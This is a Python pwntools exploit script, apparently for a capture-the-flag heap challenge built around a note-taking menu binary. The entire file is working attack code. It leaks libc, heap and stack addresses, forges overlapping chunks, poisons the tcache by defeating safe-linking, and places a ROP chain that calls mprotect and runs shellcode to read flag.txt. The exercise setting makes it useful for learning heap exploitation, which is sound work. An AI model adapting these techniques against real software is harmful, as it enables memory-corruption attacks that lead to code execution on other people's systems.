#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('0', 1337)
else:
    p = process([exe.path])
GDB()

def create_note(idx, size, data):
    sna(b'> ', 1)
    sna(b'Index: ', idx)
    sna(b'Size: ', size)
    sa(b'Data: ', data)

def delete_note(idx):
    sna(b'> ', 2)
    sna(b'Index: ', idx)

def read_note(idx):
    sna(b'> ', 3)
    sna(b'Index: ', idx)
    p.recvuntil(b'Data: ')

def edit_note(idx, data):
    sna(b'> ', 4)
    sna(b'Index: ', idx)
    sa(b'Data: ', data)



create_note(0, 0x430, b'aa')
delete_note(0)
create_note(0, 0x430, b'a'*8)
read_note(0)
p.recvuntil(b'a'*8)

libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x1e80b0
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

heap_leak = u64(p.recv(8))
heap_base = heap_leak - 0x22b0
info(f'heap leak: {hex(heap_leak)}')
info(f'heap base: {hex(heap_base)}')
delete_note(0)

create_note(0, 0xf8, b'a'*0xf0) # pad
create_note(1, 0xf8, b'\0'*0xf0) # overlap chunk
create_note(2, 0xf8, b'b'*0xf0) # victim
create_note(3, 0xf8, b'c'*0xf0) # free trigger
create_note(4, 0xf8, b'x'*0xf0)

# idx 1: overlap chunk
load = flat(
    0,
    0x1f0,
    p64(heap_base +0x22c0) * 2,
)

edit_note(1,load)

# idx 2: victim
load = flat(
    b'\0'*0xf0,
    0x1f0
)
edit_note(2,load)

# pad free to make bug_chunk go to consolidate when free
for i in range(5, 11):
    create_note(i, 0xf8, f'{i}'.encode()*0xf0)
    
for i in range(4, 11):
    delete_note(i)

delete_note(0)
delete_note(3)

create_note(0, 0x2e8, b'eheeeeeeeee')

# pad chunk to make idx still in tcache bin
for i in range(5, 11):
    create_note(i, 0xf8, f'{i}'.encode()*0xf0)

delete_note(2)


# idx now is the attacker

def math(ptr_1, ptr_2):
    return (ptr_1 >> 12) ^ ptr_2

load = flat(
    heap_base +0x2278,
    0,
    libc.sym.system
)
load = load.ljust(0xe8, b'A')
load += flat(
    0x101,
    math(heap_base +0x23c0  , heap_base+0x110)
)

edit_note(0, load)
create_note(2, 0xf8, b'padddddddddduddddd')

load = flat(
    heap_base,
    libc.sym.environ-0x18
)

# input()
create_note(4, 0xf8, load)

for i in range(5, 11):
    delete_note(i)

# overrite next malloc chunk in bin size 0x100
input()
edit_note(4, load)

# input()
create_note(5, 0xf8, b'a'*0x18)

read_note(5)

p.recvuntil(b'a'*0x18)

stack_leak  = u64(p.recv(8))
info(f'stack leak: {hex(stack_leak)}')

rbp_edit = stack_leak - 0x158

load = flat(
    heap_base,
    rbp_edit
)
input()
edit_note(4, load)

shellcode =shellcraft.open('flag.txt') + shellcraft.read('rax', 'rsp', 0x50) + shellcraft.write(1, 'rsp', 0x50)

edit_note(0, asm(shellcode))

pop_rdi = 0x0000000000102dea + libc.address
pop_rsi  =0x0000000000053847 + libc.address
pop_rdx = 0x00000000000d77bd + libc.address # pop rdx ; xor eax, eax ; ret
pop_rax = 0x00000000000d4f97 + libc.address
syscall = 0x93a75 + libc.address
# mprotect syscall == 0x0a 
shell = heap_base +0x22d0
load = flat(
    stack_leak,
    pop_rdi,
    heap_base+0x2000,
    pop_rsi,
    0x1000,
    pop_rdx,
    7,
    pop_rax,
    0x0a,
    syscall,
    shell
)
# input()
input()
create_note(6, 0xf8, load)


p.interactive()
